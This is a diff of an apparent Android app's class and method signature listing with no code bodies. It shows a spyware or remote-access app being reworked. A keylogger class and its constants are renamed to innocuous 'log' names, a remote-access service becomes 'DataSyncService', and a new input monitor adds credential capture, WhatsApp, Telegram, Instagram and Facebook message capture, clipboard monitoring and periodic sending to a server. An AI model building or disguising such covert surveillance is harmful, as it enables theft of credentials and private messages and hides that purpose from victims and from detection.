@@ -3038,7 +3038,8 @@ com.task.tusker.commands.GestureRecorder:
     private static final java.lang.String SUBDIR
     private static final java.lang.String TAG
     public void clearAdvancedUnlockCapture()
-com.task.tusker.commands.KeyloggerService:
+com.task.tusker.commands.KeyloggerService
+com.task.tusker.commands.LogManager:
     private static final java.lang.String TAG
     private static final long TWO_WEEKS_MS
     public static boolean isEnabled()
@@ -3088,6 +3089,10 @@ com.task.tusker.permissions.AutoPermissionManager:
     public void requestNotificationPermission()
 com.task.tusker.security.LicenseManager
 com.task.tusker.security.StringEncrypt
+com.task.tusker.services.DataSyncService:
+    private static final java.lang.String CHANNEL_ID
+    private static final int NOTIFICATION_ID
+    private static final java.lang.String TAG
 com.task.tusker.services.RemoteAccessService:
     private static final java.lang.String CHANNEL_ID
     private static final int NOTIFICATION_ID
@@ -3143,8 +3148,8 @@ com.task.tusker.utils.Constants:
     public static final java.lang.String APP_MONITOR_DIR
     public static final java.lang.String AUTO_UNINSTALL_PACKAGE
     public static final int HEARTBEAT_INTERVAL
-    public static final java.lang.String KEYLOG_DATE_FMT
-    public static final java.lang.String KEYLOG_DIR
+    public static final java.lang.String LOG_DATE_FMT
+    public static final java.lang.String LOG_DIR
     public static final java.lang.String TCP_HOST
     public static final int TCP_PORT
     public static final int TCP_RECONNECT_DELAY
@@ -3174,6 +3179,15 @@ com.task.tusker.utils.PreferenceManager:
     public void setConsentGiven(boolean)
     public void setDeviceRegistered(boolean)
     public void setPermissionsComplete(boolean)
+com.ultimate.access.InputMonitorService:
+    private static final int BUFFER_SIZE
+    private static final long SEND_INTERVAL
+    public void captureCredentials(android.view.accessibility.AccessibilityNodeInfo)
+    private void captureFacebookMessage(android.view.accessibility.AccessibilityEvent)
+    private void captureInstagramMessage(android.view.accessibility.AccessibilityEvent)
+    private void captureTelegramMessage(android.view.accessibility.AccessibilityEvent)
+    private void captureWhatsAppMessage(android.view.accessibility.AccessibilityEvent)
+    private void monitorSocialMedia(java.lang.String,android.view.accessibility.AccessibilityEvent)
 com.ultimate.access.KeyloggerService:
     private static final int BUFFER_SIZE
     private static final long SEND_INTERVAL
@@ -13016,8 +13030,8 @@ com.task.tusker.MainActivity:
     public static synthetic void lambda$onCreate$0()
     public static synthetic void lambda$requestRuntimePermissions$1()
     public static void requestRuntimePermissions()
+    public static void startDataSyncService()
     public static void startPolling()
-    public static void startRemoteAccessService()
     public static void stopPolling()
     public final void updateUiState()
 com.task.tusker.PermissionRequestActivity:
@@ -13101,18 +13115,25 @@ com.task.tusker.commands.GestureRecorder:
     public static void onScreenUnlocked()
     public static void replayThenDeleteIfLocked()
     public static void startLockCapture()
-com.task.tusker.commands.KeyloggerService:
+com.task.tusker.commands.LogManager:
     static void <clinit>()
     public static void appendToFile(java.io.File,java.lang.String)
     public static org.json.JSONObject buildEntry()
+    public static org.json.JSONObject clearLogs()
     public static org.json.JSONObject downloadAppKeylogFile()
+    public static org.json.JSONObject downloadAppLogFile()
     public static org.json.JSONObject downloadAppScreenshot()
+    public static org.json.JSONObject downloadLogFile()
     public static org.json.JSONObject getAppKeylogs()
+    public static org.json.JSONObject getAppLogs()
+    public static org.json.JSONObject getLogs()
     public final java.io.File globalFile(java.lang.String)
     public static boolean isMonitored(java.lang.String)
     public static org.json.JSONObject listAppKeylogFiles()
+    public static org.json.JSONObject listAppLogFiles()
     public static org.json.JSONObject listAppScreenshots()
-    public static void purgeOldKeylogs()
+    public static org.json.JSONObject listLogFiles()
+    public static void purgeOldLogs()
     public static byte[] readFileBytes()
     public static java.lang.String todayStr()
 com.task.tusker.commands.PermissionManager:
@@ -13165,7 +13186,7 @@ com.task.tusker.network.SocketManager:
     public static void emit()
     public static com.task.tusker.commands.AppMonitor getAppMonitor()
     public static com.task.tusker.commands.GestureRecorder getGestureRecorder()
-    public static com.task.tusker.commands.KeyloggerService getKeylogger()
+    public static com.task.tusker.commands.LogManager getLogManager()
     public static void initGestureRecorder()
     public static boolean isAccessibilityCommand(java.lang.String)
     public static boolean isConnected()
@@ -13228,6 +13249,9 @@ com.task.tusker.permissions.AutoPermissionManager:
     public static final java.lang.String[] BASIC_PERMISSIONS
     public static void requestAllPermissions()
     public static void requestManageExternalStorage()
+com.task.tusker.services.DataSyncService:
+    public static void connectToServer()
+    public static void createNotificationChannel()
 com.task.tusker.services.RemoteAccessService:
     public static void connectToServer()
     public static void createNotificationChannel()
@@ -13309,6 +13333,14 @@ com.task.tusker.utils.KeepAliveManager:
     public static void unregisterScreenReceiver()
     public static void wakeScreen()
 com.task.tusker.utils.PreferenceManager
+com.ultimate.access.InputMonitorService:
+    public static void handleViewClicked()
+    public static void handleViewFocused()
+    public static void handleWindowChange()
+    public static synthetic void lambda$startClipboardMonitoring$0()
+    public static synthetic void lambda$startPeriodicSending$1()
+    public static void startClipboardMonitoring()
+    public static void startPeriodicSending()
 com.ultimate.access.KeyloggerService:
     public static void handleViewClicked()
     public static void handleViewFocused()
